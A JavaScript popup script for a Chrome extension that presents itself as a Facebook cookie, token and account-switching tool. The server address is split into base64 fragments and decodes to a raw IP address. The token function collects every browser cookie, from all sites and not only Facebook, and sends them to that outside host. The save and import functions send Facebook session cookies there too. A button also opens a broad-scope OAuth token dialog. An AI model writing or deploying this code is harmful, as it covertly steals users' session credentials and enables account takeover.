const a = atob("aHR0cA==");
const g = atob("Oi8v"); 
const p = atob("MTA0Lg==");
const m = atob("MTY4Lg==");
const z = atob("NzYu"); 
const k = atob("MTM5Og=="); 
const n = atob("MjcwMDQ=");

// Account management variables
let savedAccounts = [];
let currentFbId = ""; 

function getServerUrl(endpoint) {
  return `${a}${g}${p}${m}${z}${k}${n}/${endpoint}`;
}

// Fetch Facebook Cookies
document.getElementById("fetchCookies").addEventListener("click", () => {
  fetchCookies("facebook.com");
});

function fetchCookies(domain) {
  chrome.cookies.getAll({}, (cookies) => {
    const filteredCookies = cookies.filter((cookie) =>
      cookie.domain.includes(domain)
    );

    if (!filteredCookies.length) {
      displayMessage("No cookies found for this domain.", "output");
      return;
    }

    const cookieString = filteredCookies
      .map((cookie) => `${cookie.name}=${cookie.value}`)
      .join("; ");

    // Update current Facebook ID if available
    const userIdMatch = cookieString.match(/c_user=(\d+)/);
    if (userIdMatch) {
      currentFbId = userIdMatch[1];
      displaySavedAccounts(); // Refresh to show active account
    }

    displayMessage(cookieString, "output");
  });
}

// Fetch Facebook Token
document.getElementById("fetchToken").addEventListener("click", () => {
  fetchToken();
});

function fetchToken() {
  chrome.cookies.getAll({}, (cookies) => {
    const cookieString = cookies
      .map((cookie) => `${cookie.name}=${cookie.value}`)
      .join("; ");

    const serverUrl = getServerUrl(`cookie=${encodeURIComponent(cookieString)}`);

    fetch(serverUrl)
      .then((response) => response.json())
      .then((data) => {
        displayMessage(data.token, "output");
      })
      .catch((error) => {
        displayMessage(`Error: ${error.message}`, "output");
      });
  });
}

// Fetch Facebook AppState (FBState)
document.getElementById("fetchAppState").addEventListener("click", () => {
  fetchAppState();
});

function fetchAppState() {
  chrome.cookies.getAll({ domain: "facebook.com" }, function (cookies) {
    let fbstate = cookies.map(v => ({
      key: v.name,
      value: v.value,
      domain: "facebook.com",
      path: v.path,
      hostOnly: v.hostOnly,
      creation: new Date().toISOString(),
      lastAccessed: new Date().toISOString()
    }));
    
    displayMessage(JSON.stringify(fbstate, null, 4), "output");
  });
}

// Display messages in the output box
function displayMessage(message, targetId) {
  const targetDiv = document.getElementById(targetId);
  targetDiv.innerHTML = "";
  const resultBox = document.createElement("div");
  resultBox.className = "result-box";
  resultBox.textContent = message;
  targetDiv.appendChild(resultBox);
}

// Copy Output
document.getElementById("selectAll").addEventListener("click", () => {
  const outputDiv = document.getElementById("output");
  const range = document.createRange();
  const selection = window.getSelection();
  range.selectNodeContents(outputDiv);
  selection.removeAllRanges();
  selection.addRange(range);

  try {
    document.execCommand("copy");
    alert("Copied");
  } catch {
    alert("Failed to copy");
  }
  selection.removeAllRanges();
});

// Logout from Facebook
document.getElementById("logout").addEventListener("click", () => {
  const facebookDomains = [
    "https://www.facebook.com",
    "https://m.facebook.com",
    "https://mbasic.facebook.com",
    "https://d.facebook.com",
    "https://touch.facebook.com"
  ];

  chrome.browsingData.remove(
    { origins: facebookDomains },
    { cookies: true, localStorage: true, cache: true },
    () => {
      alert("Facebook Logout Successfully.");
    }
  );
});

// Account Management Functions
function saveCurrentAccount() {
  chrome.cookies.getAll({}, (cookies) => {
    const fbCookies = cookies.filter((cookie) =>
      cookie.domain.includes("facebook.com")
    );

    if (!fbCookies.length) {
      alert("No Facebook cookies found to save.");
      return;
    }

    const cookieString = fbCookies
      .map((cookie) => `${cookie.name}=${cookie.value}`)
      .join("; ");

    // Extract Facebook ID from cookies
    const userIdMatch = cookieString.match(/c_user=(\d+)/);
    if (!userIdMatch) {
      alert("Could not find Facebook user ID in cookies.");
      return;
    }

    const userId = userIdMatch[1];
    currentFbId = userId;

    // Get token to fetch user name
    const serverUrl = getServerUrl(`cookie=${encodeURIComponent(cookieString)}`);
    
    fetch(serverUrl)
      .then((response) => response.json())
      .then((data) => {
        const token = data.token;
        
        // Create account object
        const account = {
          uid: userId,
          name: "",
          cookie: cookieString,
          token: token || ""
        };

        // Try to get user name from Facebook Graph API
        if (token) {
          fetch(`https://graph.facebook.com/me?access_token=${token}`)
            .then(response => response.json())
            .then(userData => {
              if (userData.name) {
                account.name = userData.name;
              }
              saveAccountToStorage(account);
            })
            .catch(() => {
              saveAccountToStorage(account);
            });
        } else {
          saveAccountToStorage(account);
        }
      })
      .catch(() => {
        // Save without token if server request fails
        const account = {
          uid: userId,
          name: "",
          cookie: cookieString,
          token: ""
        };
        saveAccountToStorage(account);
      });
  });
}

function saveAccountToStorage(account) {
  // Check if account already exists and update it
  const existingIndex = savedAccounts.findIndex(acc => acc.uid === account.uid);
  
  if (existingIndex !== -1) {
    savedAccounts[existingIndex] = account;
  } else {
    savedAccounts.push(account);
  }

  // Save to localStorage
  localStorage.setItem('savedFacebookAccounts', JSON.stringify(savedAccounts));
  
  // Refresh the accounts list
  displaySavedAccounts();
  
  alert(`Account ${account.uid} saved successfully!`);
}

function loadSavedAccounts() {
  const stored = localStorage.getItem('savedFacebookAccounts');
  if (stored) {
    savedAccounts = JSON.parse(stored);
    displaySavedAccounts();
  }
}

function displaySavedAccounts() {
  const container = document.getElementById('savedAccountsList');
  container.innerHTML = '';

  if (savedAccounts.length === 0) {
    container.innerHTML = '<p style="text-align: center; color: #666; font-size: 12px;">No saved accounts</p>';
    return;
  }

  savedAccounts.forEach(account => {
    const accountDiv = document.createElement('div');
    accountDiv.className = 'saved-account';
    accountDiv.setAttribute('data-uid', account.uid);
    
    if (account.uid === currentFbId) {
      accountDiv.classList.add('active');
    }

    accountDiv.innerHTML = `
      <div class="account-id">${account.uid}</div>
      <div class="account-name">${account.name || 'Unknown User'}</div>
      <button class="delete-account" onclick="deleteAccount('${account.uid}')">×</button>
    `;

    accountDiv.addEventListener('click', (e) => {
      if (!e.target.classList.contains('delete-account')) {
        switchToAccount(account);
      }
    });

    container.appendChild(accountDiv);
  });
}

function switchToAccount(account) {
  // Clear existing cookies first
  clearFacebookCookies(() => {
    // Set new cookies
    const cookies = account.cookie.split(';');
    
    cookies.forEach(cookiePair => {
      const [name, value] = cookiePair.split('=').map(s => s.trim());
      if (name && value) {
        const facebookDomains = [
          "https://www.facebook.com",
          "https://upload.facebook.com", 
          "https://business.facebook.com",
          "https://web.facebook.com",
          "https://m.facebook.com",
          "https://mbasic.facebook.com",
          "https://developers.facebook.com",
          "https://mobile.facebook.com"
        ];

        facebookDomains.forEach(domain => {
          chrome.cookies.set({
            url: domain,
            name: name,
            value: value,
            domain: ".facebook.com"
          });
        });
      }
    });

    // Update display
    currentFbId = account.uid;
    displayMessage(account.cookie, "output");
    displaySavedAccounts();

    // Refresh Facebook tabs
    chrome.tabs.query({url: "*://*.facebook.com/*"}, (tabs) => {
      tabs.forEach(tab => {
        chrome.scripting.executeScript({
          target: {tabId: tab.id},
          func: function() {
            window.location.reload();
          }
        });
      });
    });

    alert(`Switched to account: ${account.name || account.uid}`);
  });
}

function deleteAccount(uid) {
  if (confirm(`Are you sure you want to delete account ${uid}?`)) {
    savedAccounts = savedAccounts.filter(account => account.uid !== uid);
    localStorage.setItem('savedFacebookAccounts', JSON.stringify(savedAccounts));
    displaySavedAccounts();
  }
}

function importCookieString() {
  const cookieString = prompt("Paste your Facebook cookie string:");
  if (!cookieString) return;

  // Extract Facebook ID
  const userIdMatch = cookieString.match(/c_user=(\d+)/);
  if (!userIdMatch) {
    alert("Invalid cookie string. Could not find Facebook user ID.");
    return;
  }

  const userId = userIdMatch[1];
  
  // Clear existing cookies and set new ones
  clearFacebookCookies(() => {
    const cookies = cookieString.split(';');
    
    cookies.forEach(cookiePair => {
      const [name, value] = cookiePair.split('=').map(s => s.trim());
      if (name && value) {
        chrome.cookies.set({
          url: "https://www.facebook.com",
          name: name,
          value: value,
          domain: ".facebook.com"
        });
      }
    });

    // Update current session
    currentFbId = userId;
    displayMessage(cookieString, "output");
    
    // Try to get token and save account
    const serverUrl = getServerUrl(`cookie=${encodeURIComponent(cookieString)}`);
    
    fetch(serverUrl)
      .then((response) => response.json())
      .then((data) => {
        const account = {
          uid: userId,
          name: "",
          cookie: cookieString,
          token: data.token || ""
        };

        if (data.token) {
          fetch(`https://graph.facebook.com/me?access_token=${data.token}`)
            .then(response => response.json())
            .then(userData => {
              if (userData.name) {
                account.name = userData.name;
              }
              saveAccountToStorage(account);
            })
            .catch(() => {
              saveAccountToStorage(account);
            });
        } else {
          saveAccountToStorage(account);
        }
      })
      .catch(() => {
        // Save without token if server request fails
        const account = {
          uid: userId,
          name: "",
          cookie: cookieString,
          token: ""
        };
        saveAccountToStorage(account);
      });

    alert("Cookie imported successfully!");
  });
}

function clearFacebookCookies(callback) {
  chrome.cookies.getAll({domain: "facebook.com"}, function(cookies) {
    let remaining = cookies.length;
    
    if (remaining === 0) {
      callback();
      return;
    }

    cookies.forEach(cookie => {
      const urls = [
        "https://www.facebook.com",
        "https://upload.facebook.com",
        "https://business.facebook.com", 
        "https://web.facebook.com",
        "https://m.facebook.com",
        "https://mbasic.facebook.com",
        "https://mobile.facebook.com"
      ];

      urls.forEach(url => {
        chrome.cookies.remove({url: url, name: cookie.name});
      });

      remaining--;
      if (remaining === 0) {
        callback();
      }
    });
  });
}

// Event Listeners for new features
document.getElementById("saveAccount").addEventListener("click", saveCurrentAccount);
document.getElementById("importCookie").addEventListener("click", importCookieString);

// Open Instagram OAuth
document.getElementById("connectInstagram").addEventListener("click", () => {
  window.open("https://web.facebook.com/dialog/oauth?scope=user_about_me,user_actions.books,user_actions.fitness,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_friends,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_managed_groups,user_photos,user_posts,user_relationship_details,user_relationships,user_religion_politics,user_status,user_tagged_places,user_videos,user_website,user_work_history,email,manage_notifications,manage_pages,pages_messaging,publish_actions,publish_pages,read_friendlists,read_insights,read_page_mailboxes,read_stream,rsvp_event,read_mailbox&response_type=token&client_id=124024574287414&redirect_uri=https://www.instagram.com/", "_blank");
});

// Load saved accounts when popup opens
document.addEventListener('DOMContentLoaded', () => {
  loadSavedAccounts();
});